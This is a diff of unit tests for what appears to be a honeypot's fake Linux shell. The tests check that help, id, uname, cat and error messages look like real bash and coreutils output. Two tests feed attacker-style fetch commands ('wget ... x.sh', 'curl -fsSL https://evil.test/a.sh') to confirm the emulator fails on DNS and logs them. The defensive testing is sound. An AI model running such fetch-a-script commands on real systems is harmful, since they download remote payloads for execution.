@@ -250,3 +250,110 @@ def test_engine_normalizes_ls_paths_without_escaping_root():
 
     assert "hosts" in response
     assert "passwd" in response
+
+
+def test_help_is_bash_builtin_help_not_a_command_menu():
+    """A list of "available commands" would announce a fake shell."""
+    engine = InteractionEngine()
+    session = create_session()
+
+    response = engine.process("help", session)
+
+    assert response.startswith("GNU bash, version")
+    assert "Available commands" not in response
+
+
+def test_question_mark_is_not_a_command():
+    engine = InteractionEngine()
+    session = create_session()
+
+    assert "bash: ?: command not found" in engine.process("?", session)
+
+
+def test_id_matches_a_non_root_persona():
+    """id must agree with whoami and the "$" prompt."""
+    engine = InteractionEngine()
+    session = SessionState(
+        ("127.0.0.1", 4444),
+        persona=get_persona("ubuntu_web_server"),
+    )
+
+    response = engine.process("id", session)
+
+    assert response.startswith("uid=1000(ubuntu) gid=1000(ubuntu)")
+    assert "root" not in response.split("\n")[0]
+
+
+def test_uname_without_flags_prints_kernel_name():
+    engine = InteractionEngine()
+    session = create_session()
+
+    assert engine.process("uname", session) == "Linux\n" + session.prompt()
+
+
+def test_uname_flags_are_answered_from_the_persona():
+    engine = InteractionEngine()
+    session = create_session()
+
+    assert engine.process("uname -r", session).startswith("5.15.0-91-generic\n")
+    assert engine.process("uname -m", session).startswith("x86_64\n")
+    assert engine.process("uname -snrm", session).startswith(
+        "Linux ip-10-0-0-12 5.15.0-91-generic x86_64\n"
+    )
+    assert engine.process("uname --all", session).startswith(session.persona.uname_output)
+
+
+def test_uname_rejects_unknown_option_like_coreutils():
+    engine = InteractionEngine()
+    session = create_session()
+
+    response = engine.process("uname -x", session)
+
+    assert "uname: invalid option -- 'x'" in response
+
+
+def test_wget_fails_on_dns_without_downloading():
+    engine = InteractionEngine()
+    session = create_session()
+
+    response = engine.process("wget http://example.com/x.sh", session)
+
+    assert "wget: unable to resolve host address 'example.com'" in response
+    assert "command not found" not in response
+    assert session.commands[-1]["cmd"] == "wget http://example.com/x.sh"
+
+
+def test_curl_fails_on_dns_without_downloading():
+    engine = InteractionEngine()
+    session = create_session()
+
+    response = engine.process("curl -fsSL https://evil.test/a.sh", session)
+
+    assert "curl: (6) Could not resolve host: evil.test" in response
+
+
+def test_cat_on_a_directory_says_is_a_directory():
+    engine = InteractionEngine()
+    session = create_session()
+
+    assert "cat: /etc: Is a directory" in engine.process("cat /etc", session)
+
+
+def test_errors_echo_the_operand_as_typed():
+    """Real cat/ls/cd print the path the user typed, not a resolved one."""
+    engine = InteractionEngine()
+    session = create_session()
+
+    assert "cat: nope: No such file or directory" in engine.process("cat nope", session)
+    assert "ls: cannot access 'nope'" in engine.process("ls nope", session)
+    assert "bash: cd: nope: No such file or directory" in engine.process("cd nope", session)
+
+
+def test_banner_last_login_is_not_a_fixed_placeholder():
+    engine = InteractionEngine()
+    session = create_session()
+
+    banner = engine.build_banner(session)
+
+    assert "from unknown" not in banner
+    assert "Last login: " in banner
